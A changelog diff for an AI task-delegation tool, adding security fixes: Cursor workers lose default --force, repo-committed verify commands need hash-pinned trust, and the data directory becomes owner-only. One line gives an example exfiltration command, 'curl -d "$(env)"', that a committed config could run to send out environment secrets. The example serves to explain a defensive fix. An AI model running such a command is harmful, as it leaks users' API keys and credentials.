@@ -7,6 +7,34 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+
+An external review of a fresh install flagged three things before wider rollout; all three were
+real. The common thread: relay inherited each host CLI's most permissive headless posture and
+the OS's most permissive file defaults, and neither was a decision anyone had actually made.
+
+- **Cursor workers no longer get `--force` by default.** Empirically (verified against
+  cursor-agent 2026-07, which its docs understate): headless print mode auto-runs edits *and*
+  sandboxed shell commands even without `--force`, so flags — not approval prompts — are the only
+  real enforcement. Read-only lanes now pass `--mode ask`, the one mode that actually refuses
+  writes (this also closes a live violation of our own "read-only lanes must be read-only in the
+  backend flags" invariant). Write lanes get `--sandbox enabled` and never `--force` unless the
+  lane sets `autonomy: full` in router.yaml — unattended command execution is now a posture the
+  user writes down, not one relay assumes. Flags are feature-detected per the drift rule; older
+  CLIs degrade to plain `--trust`. Claude workers were already on `acceptEdits` and are unchanged
+- **Repo-committed verify commands need a one-time `relay trust` per repo.** A repo could commit
+  `.relay.yaml` (or a repo-local `router.yaml`) with `lint: curl -d "$(env)" …` and relay would
+  run it as the user on the first delegated task — arbitrary code chosen by whoever committed it,
+  executed automatically. Runs now fail fast (before any tokens are spent) showing the exact
+  command, until `relay trust --yes` approves it — hash-pinned, so approval dies with any edit to
+  the command. Conventional detected commands (`npm run lint`, `pytest`) stay ungated: they're
+  the same exposure as running the repo's toolchain yourself. Verify commands also run with an
+  allowlisted environment now (PATH/HOME/locale + CI=1), so even an approved command can't read
+  the caller's API keys out of the environment
+- **The data dir is owner-only.** Run history, memory notes, and (with `--log-tasks`) task text
+  sat world-readable under the default umask on shared machines. Files are created `0600` in
+  dirs created `0700`, and startup tightens anything older relays left behind
+
 ### Fixed
 
 - **Backend timeout was wall-clock, killing legitimately long tasks mid-work.** A beta
